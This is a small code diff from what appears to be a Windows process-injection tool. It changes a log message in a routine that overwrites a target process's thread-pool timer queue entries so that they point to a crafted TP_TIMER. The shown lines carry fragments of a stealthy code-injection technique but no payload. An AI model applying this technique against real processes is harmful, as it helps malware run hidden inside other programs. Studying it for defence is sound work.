@@ -387,7 +387,7 @@ void RemoteTpTimerInsertion::SetupExecution() const
 		&pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, 
 		reinterpret_cast<PVOID>(&TpTimerWindowEndLinks),
 		sizeof(TpTimerWindowEndLinks));
-	BOOST_LOG_TRIVIAL(info) << "Modified the target process's TP_POOL tiemr queue list entry to point to the specially crafted TP_TIMER";
+	BOOST_LOG_TRIVIAL(info) << "Modified the target process's TP_POOL tiemr queue WindowsStart and WindowsEnd to point to the specially crafted TP_TIMER";
 
 	LARGE_INTEGER ulDueTime{ 0 };
 	ulDueTime.QuadPart = Timeout;
